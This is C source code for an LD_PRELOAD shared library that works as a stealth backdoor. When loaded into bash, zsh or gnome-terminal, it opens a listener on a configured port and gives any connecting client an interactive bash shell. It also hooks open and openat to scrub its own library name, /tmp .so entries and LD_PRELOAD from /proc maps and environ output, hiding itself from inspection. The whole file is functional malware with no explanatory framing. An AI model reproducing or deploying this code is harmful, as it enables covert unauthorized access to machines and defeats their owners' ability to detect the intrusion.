#define _GNU_SOURCE
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/mman.h>

static volatile int ghost_fd = -1;
static volatile int should_run = 1;

typedef int (*open_t)(const char *, int, ...);
typedef int (*openat_t)(int, const char *, int, ...);
typedef ssize_t (*read_t)(int, void *, size_t);
typedef ssize_t (*write_t)(int, const void *, size_t);
typedef int (*close_t)(int);
typedef int (*memfd_create_t)(const char *, unsigned int);

static open_t real_open = NULL;
static openat_t real_openat = NULL;
static read_t real_read = NULL;
static close_t real_close = NULL;
static write_t real_write = NULL;
static memfd_create_t real_memfd_create = NULL;

static pthread_mutex_t ghost_fd_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t filter_mutex = PTHREAD_MUTEX_INITIALIZER;

static int init_libc_funcs(void) {
    real_open = (open_t)dlsym(RTLD_NEXT, "open");
    real_openat = (openat_t)dlsym(RTLD_NEXT, "openat");
    real_read = (read_t)dlsym(RTLD_NEXT, "read");
    real_write = (write_t)dlsym(RTLD_NEXT, "write");
    real_close = (close_t)dlsym(RTLD_NEXT, "close");
    real_memfd_create = (memfd_create_t)dlsym(RTLD_NEXT, "memfd_create");
    return (real_open && real_openat && real_read && real_write && real_close && real_memfd_create) ? 0 : -1;
}

static int is_target_process(void) {
    char comm[256] = {0};
    ssize_t len = readlink("/proc/self/exe", comm, sizeof(comm) - 1);
    if (len <= 0) return 0;
    comm[len] = '\0';
    
    return (strstr(comm, "gnome-terminal") != NULL || 
            strstr(comm, "zsh") != NULL ||
            strstr(comm, "bash") != NULL);
}

static int is_ghost_path(const char *path) {
    if (!path) return 0;
    return (strstr(path, "/proc/self/maps") != NULL ||
            strstr(path, "/proc/self/environ") != NULL ||
            (strstr(path, "/proc/") != NULL && strstr(path, "/maps") != NULL) ||
            (strstr(path, "/proc/") != NULL && strstr(path, "/environ") != NULL));
}

static int create_filtered_memfd(const char *content, size_t len) {
    if (!real_memfd_create) {
        if (init_libc_funcs() < 0) return -1;
    }
    
    int fd = real_memfd_create("", MFD_CLOEXEC);
    if (fd < 0) return -1;
    
    if (real_write(fd, content, len) != (ssize_t)len) {
        real_close(fd);
        return -1;
    }
    
    if (lseek(fd, 0, SEEK_SET) < 0) {
        real_close(fd);
        return -1;
    }
    
    return fd;
}

static char *filter_environ(const char *path) {
    pthread_mutex_lock(&filter_mutex);
    
    static char *filtered = NULL;
    static size_t filtered_size = 65536;
    
    if (!filtered) {
        filtered = calloc(1, filtered_size);
        if (!filtered) {
            pthread_mutex_unlock(&filter_mutex);
            return NULL;
        }
    }
    
    memset(filtered, 0, filtered_size);
    
    if (!real_open || !real_read || !real_close) {
        if (init_libc_funcs() < 0) {
            pthread_mutex_unlock(&filter_mutex);
            return NULL;
        }
    }
    
    int fd = real_open(path, O_RDONLY);
    if (fd < 0) {
        pthread_mutex_unlock(&filter_mutex);
        return NULL;
    }
    
    char buffer[4096];
    size_t total = 0;
    ssize_t n;
    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < filtered_size - 1) {
        buffer[n] = '\0';
        
        char *src = buffer;
        char *dst = filtered + total;
        while (*src) {
            if (strncmp(src, "LD_PRELOAD=", 11) == 0) {
                src = strchr(src, '\n');
                if (!src) break;
                src++;
                continue;
            }
            *dst++ = *src++;
        }
        total = dst - filtered;
    }
    real_close(fd);
    
    pthread_mutex_unlock(&filter_mutex);
    return filtered;
}

static char *filter_maps(const char *path) {
    pthread_mutex_lock(&filter_mutex);
    
    static char *filtered = NULL;
    static size_t filtered_size = 262144;
    
    if (!filtered) {
        filtered = calloc(1, filtered_size);
        if (!filtered) {
            pthread_mutex_unlock(&filter_mutex);
            return NULL;
        }
    }
    
    memset(filtered, 0, filtered_size);
    
    if (!real_open || !real_read || !real_close) {
        if (init_libc_funcs() < 0) {
            pthread_mutex_unlock(&filter_mutex);
            return NULL;
        }
    }
    
    int fd = real_open(path, O_RDONLY);
    if (fd < 0) {
        pthread_mutex_unlock(&filter_mutex);
        return NULL;
    }
    
    char buffer[4096];
    size_t total = 0;
    ssize_t n;
    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < filtered_size - 1) {
        buffer[n] = '\0';
        
        char *src = buffer;
        char *dst = filtered + total;
        while (*src) {
            if ((strstr(src, GHOST_SO_NAME) != NULL && 
                 (src == buffer || *(src-1) == '\n')) ||
                (strstr(src, "/tmp/") != NULL && strstr(src, ".so") != NULL)) {
                src = strchr(src, '\n');
                if (!src) break;
                src++;
                continue;
            }
            *dst++ = *src++;
        }
        total = dst - filtered;
    }
    real_close(fd);
    
    pthread_mutex_unlock(&filter_mutex);
    return filtered;
}

int open(const char *path, int flags, ...) {
    if (!real_open) init_libc_funcs();
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }
    
    if (is_ghost_path(path)) {
        if (strstr(path, "environ") != NULL) {
            char *filtered = filter_environ(path);
            if (filtered && *filtered) {
                int memfd = create_filtered_memfd(filtered, strlen(filtered));
                if (memfd >= 0) {
                    return memfd;
                }
            }
        }
        else if (strstr(path, "maps") != NULL) {
            char *filtered = filter_maps(path);
            if (filtered && *filtered) {
                int memfd = create_filtered_memfd(filtered, strlen(filtered));
                if (memfd >= 0) {
                    return memfd;
                }
            }
        }
    }
    
    return real_open(path, flags, mode);
}

int openat(int dirfd, const char *path, int flags, ...) {
    if (!real_openat) {
        init_libc_funcs();
    }
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }
    
    if (is_ghost_path(path)) {
        if (strstr(path, "environ") != NULL) {
            char *filtered = filter_environ(path);
            if (filtered && *filtered) {
                int memfd = create_filtered_memfd(filtered, strlen(filtered));
                if (memfd >= 0) {
                    return memfd;
                }
            }
        }
        else if (strstr(path, "maps") != NULL) {
            char *filtered = filter_maps(path);
            if (filtered && *filtered) {
                int memfd = create_filtered_memfd(filtered, strlen(filtered));
                if (memfd >= 0) {
                    return memfd;
                }
            }
        }
    }
    
    return real_openat(dirfd, path, flags, mode);
}

void *ghost_listener(void *arg) {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    int opt = 1;
    socklen_t addrlen = sizeof(addr);
    
    prctl(PR_SET_NAME, FAKE_THREAD_NAME, 0, 0, 0);
    
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return NULL;
    
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        close(server_fd);
        return NULL;
    }
    
    int flags = fcntl(server_fd, F_GETFD, 0);
    if (flags >= 0) fcntl(server_fd, F_SETFD, flags | FD_CLOEXEC);
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(GHOST_PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(server_fd);
        return NULL;
    }
    
    if (listen(server_fd, 3) < 0) {
        close(server_fd);
        return NULL;
    }
    
    pthread_mutex_lock(&ghost_fd_mutex);
    ghost_fd = server_fd;
    pthread_mutex_unlock(&ghost_fd_mutex);

    while (should_run) {
        struct timeval tv = {2, 0}; 
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(server_fd, &fds);
        
        int ret = select(server_fd + 1, &fds, NULL, NULL, &tv);
        if (ret < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (ret == 0) {
            if (access(KILL_SWITCH, F_OK) == 0) {
                should_run = 0;
                break;
            }
            continue;
        }
        
        client_fd = accept(server_fd, (struct sockaddr *)&addr, &addrlen);
        if (client_fd >= 0) {
            pid_t pid = fork();
            if (pid == 0) {
                int my_ghost_fd = ghost_fd;
                if (my_ghost_fd >= 0) close(my_ghost_fd);
                dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
                close(client_fd);
                unsetenv("LD_PRELOAD"); 
                execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
                exit(0);
            }
            close(client_fd);
            if (pid > 0) waitpid(pid, NULL, WNOHANG);
        }
    }
    
    pthread_mutex_lock(&ghost_fd_mutex);
    if (ghost_fd == server_fd) {
        close(server_fd);
        ghost_fd = -1;
    }
    pthread_mutex_unlock(&ghost_fd_mutex);
    
    return NULL;
}

__attribute__((constructor))
void init_ghost(void) {
    if (!is_target_process()) return;
    
    if (init_libc_funcs() < 0) return;

    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&tid, &attr, ghost_listener, NULL);
    pthread_attr_destroy(&attr);
}

__attribute__((destructor))
void cleanup_ghost(void) {
    should_run = 0;
    if (pthread_mutex_trylock(&ghost_fd_mutex) == 0) {
        if (ghost_fd >= 0) {
            close(ghost_fd);
            ghost_fd = -1;
        }
        pthread_mutex_unlock(&ghost_fd_mutex);
    }
}
